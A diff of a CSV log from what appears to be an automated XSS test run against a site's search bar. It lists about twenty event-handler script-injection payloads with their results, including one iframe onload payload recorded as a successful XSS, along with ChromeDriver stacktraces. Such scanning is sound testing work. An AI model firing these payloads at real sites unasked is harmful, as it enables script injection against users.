@@ -10,27 +10,69 @@
 "<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
 "<textarea onfocus=alert(1) autofocus><![CDATA[alert(1)","search_bar","error","Test failed after retries","Error: Alert Text: 1
 Message: unexpected alert open: {Alert text : 1}
-  (Session info: chrome=138.0.7204.49)
+  (Session info: chrome=138.0.7204.158)
 Stacktrace:
-	GetHandleVerifier [0x0x7ff786a86f65+76917]
-	GetHandleVerifier [0x0x7ff786a86fc0+77008]
-	(No symbol) [0x0x7ff786839dea]
-	(No symbol) [0x0x7ff78684a939]
-	(No symbol) [0x0x7ff78685178a]
-	(No symbol) [0x0x7ff78682608d]
-	(No symbol) [0x0x7ff786849e11]
-	(No symbol) [0x0x7ff7868e0535]
-	(No symbol) [0x0x7ff7868b8243]
-	(No symbol) [0x0x7ff786881431]
-	(No symbol) [0x0x7ff7868821c3]
-	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
-	GetHandleVerifier [0x0x7ff786d578f3+3028483]
-	GetHandleVerifier [0x0x7ff786d7588d+3151261]
-	GetHandleVerifier [0x0x7ff786aa182e+185662]
-	GetHandleVerifier [0x0x7ff786aa96ef+218111]
-	GetHandleVerifier [0x0x7ff786a8fae4+112628]
-	GetHandleVerifier [0x0x7ff786a8fc99+113065]
-	GetHandleVerifier [0x0x7ff786a76c68+10616]
-	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
-	RtlUserThreadStart [0x0x7ffea749c34c+44]
+	GetHandleVerifier [0x0x7ff68560e925+77845]
+	GetHandleVerifier [0x0x7ff68560e980+77936]
+	(No symbol) [0x0x7ff6853c9cda]
+	(No symbol) [0x0x7ff685471582]
+	(No symbol) [0x0x7ff6854486a3]
+	(No symbol) [0x0x7ff685411791]
+	(No symbol) [0x0x7ff685412523]
+	GetHandleVerifier [0x0x7ff6858e683d+3059501]
+	GetHandleVerifier [0x0x7ff6858e0bfd+3035885]
+	GetHandleVerifier [0x0x7ff6859003f0+3164896]
+	GetHandleVerifier [0x0x7ff685628c2e+185118]
+	GetHandleVerifier [0x0x7ff68563053f+216111]
+	GetHandleVerifier [0x0x7ff6856172d4+113092]
+	GetHandleVerifier [0x0x7ff685617489+113529]
+	GetHandleVerifier [0x0x7ff6855fe288+10616]
+	BaseThreadInitThunk [0x0x7fffa98be8d7+23]
+	RtlUserThreadStart [0x0x7fffaa3bc34c+44]
+"
+"<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ)","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU)","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd)","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1)","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<iframe onload=eval(alert(1))>","search_bar","working","Alert triggered: 1","Successful XSS in search_bar (immediate handle)"
+"<input onkeydown=prompt(1)>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)-->","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<marquee onfocus=alert(1)<![CDATA[alert(1)>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<marquee id=xss onmouseover=alert(1)>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<input onstart=alert(1)>alert(1)]]>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<div class=xss onmouseover=prompt(1)>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<marquee onkeydown=prompt(1)>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<div onchange=alert(1)>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<marquee onchange=console.log(XSS)>console.log(XSS)>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<a onchange=alert(1)<!--alert(1)-->","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<iframe onkeydown=console.log(""XSS"")<!--console.log(""XSS"")-->","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<marquee onchange=console.log(""XSS"")>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<textarea onkeydown=eval(""alert(1)"")<!--eval(""alert(1)"")"">","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
+"<iframe style=""display:none"" onchange=eval(""alert(1)"")>","search_bar","error","Test failed","Error: Message: element not interactable: [object HTMLIFrameElement] has no size and location
+  (Session info: chrome=138.0.7204.158)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff68560e925+77845]
+	GetHandleVerifier [0x0x7ff68560e980+77936]
+	(No symbol) [0x0x7ff6853c9cda]
+	(No symbol) [0x0x7ff6853d1679]
+	(No symbol) [0x0x7ff6853d471c]
+	(No symbol) [0x0x7ff6853d47ef]
+	(No symbol) [0x0x7ff685427a64]
+	(No symbol) [0x0x7ff685426c9b]
+	(No symbol) [0x0x7ff68547c23d]
+	(No symbol) [0x0x7ff6854488ca]
+	(No symbol) [0x0x7ff685470b07]
+	(No symbol) [0x0x7ff6854486a3]
+	(No symbol) [0x0x7ff685411791]
+	(No symbol) [0x0x7ff685412523]
+	GetHandleVerifier [0x0x7ff6858e683d+3059501]
+	GetHandleVerifier [0x0x7ff6858e0bfd+3035885]
+	GetHandleVerifier [0x0x7ff6859003f0+3164896]
+	GetHandleVerifier [0x0x7ff685628c2e+185118]
+	GetHandleVerifier [0x0x7ff68563053f+216111]
+	GetHandleVerifier [0x0x7ff6856172d4+113092]
+	GetHandleVerifier [0x0x7ff685617489+113529]
+	GetHandleVerifier [0x0x7ff6855fe288+10616]
+	BaseThreadInitThunk [0x0x7fffa98be8d7+23]
+	RtlUserThreadStart [0x0x7fffaa3bc34c+44]
 "
